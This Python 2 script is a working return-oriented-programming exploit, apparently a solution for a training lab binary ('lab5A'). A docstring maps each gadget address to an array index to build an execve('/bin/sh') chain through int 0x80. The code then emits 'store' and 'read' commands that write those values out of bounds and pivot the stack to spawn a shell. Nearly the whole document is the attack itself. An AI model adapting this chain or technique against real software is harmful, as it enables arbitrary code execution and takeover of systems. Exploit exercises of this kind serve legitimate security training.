#!/usr/bin/python

import time

'''

1) Indexes 25-26 put /bin /sh\x00
	a) 25 => 0x69622f2f => (1768042287)
	b) 26 => 0x68732f6e => (1752379246)
2) Index 4 => address of /bin/sh\x00 (3221222828) ===> 0xbffff5ac	
3) Index 5 => set eax to 0 and jump to index 7 (134646880) ===> 0x08068c60 : xor eax, eax ; pop edi ; ret;
4) Index 7 => set eax to 10 and ret to index 8 (135118726) ===> 0x080dbf86 : add al, 0xa
5) Index 8 => Jump from index 8 to index 10 (134520309)    ===> 0x08049df5 : pop esi ; ret
6) Index 10 => inc ecx ret (135117764) ===> 0x080dbbc4 : inc ecx ; ret
7) Index 11 => Jump to index 13 (134520309) ===>  0x08049df5 : pop esi ; ret
8) Index 13 => inc ecx ret (135117764) ===> 0x080dbbc4 : inc ecx ; ret
9) Index 14 => Jump to index 16 (134520309)  ===> 0x08049df5 : pop esi ; ret
10) Index 16 => mov 0xffffffff to edx ret (134565061) ===> 0x08054cc5 : mov edx, 0xffffffff ; ret
11) Index 17 => Jump to index 19 (134520309) ===> 0x08049df5 : pop esi ; ret
12) Index 19 => inc edx ret (134601495) ===> 0x0805db17 : inc edx ; ret
13) Index 20 => Jump to index 22 (134520309) ===> 0x08049df5 : pop esi ; ret
14) Index 22 => inc eax and ret (134725142) 0x0807be16 : inc eax ; ret
15) Index 23 = > Interrupt Int 0x80 (134516394) 
16) Trigger ROP by 134977298 as num and index -11 and jump to point 2 ===> 0x080b9712 : add esp, 0x38 ; mov eax, ebx ; pop ebx ; ret

'''


gadgets = {'0x69622f2f':'1768042287', 
	   '0x68732f6e':'1752379246',
	   '0xbffff5ac':'3221222828',
	   '0x08068c60':'134646880',
	   '0x080dbf86':'135118726',
	   '0x08049df5':'134520309',
	   '0x080dbbc4':'135117764',
	   '0x08054cc5':'134565061',
       '0x0805db17':'134601495',
       '0x0807be16':'134725142',
	   '0x08048eaa':'134516394',
	   '0x080b9712':'134977298',
	   '0xbffff69c':'3221223068'} #<=== correct offset important to use fixenv fixenv gdb /levels/lab05/lab5A to calculate proper offset


print 'store\n'
print gadgets['0x69622f2f']+'\n' 
print '25\n'
print 'read\n'
print '25\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x68732f6e']+'\n' 
print '26\n'
print 'read\n'
print '26\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0xbffff69c']+'\n' 
print '4\n'
print 'read\n'
print '4\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x08068c60']+'\n' 
print '5\n'
print 'read\n'
print '5\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x080dbf86']+'\n' 
print '7\n'
print 'read\n'
print '7\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x08049df5']+'\n' 
print '8\n'
print 'read\n'
print '8\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x080dbbc4']+'\n' 
print '10\n'
print 'read\n'
print '10\n'


time.sleep(0.4)

print 'store\n'
print gadgets['0x08049df5']+'\n' 
print '11\n'
print 'read\n'
print '11\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x080dbbc4']+'\n' 
print '13\n'
print 'read\n'
print '13\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x08049df5']+'\n' 
print '14\n'
print 'read\n'
print '14\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x08054cc5']+'\n' 
print '16\n'
print 'read\n'
print '16\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x08049df5']+'\n' 
print '17\n'
print 'read\n'
print '17\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x0805db17']+'\n' 
print '19\n'
print 'read\n'
print '19\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x08049df5']+'\n' 
print '20\n'
print 'read\n'
print '20\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x0807be16']+'\n' 
print '22\n'
print 'read\n'
print '22\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x08048eaa']+'\n' 
print '23\n'
print 'read\n'
print '23\n'

time.sleep(0.4)

print 'store\n'
print gadgets['0x080b9712']+'\n' 
print '-11\n'


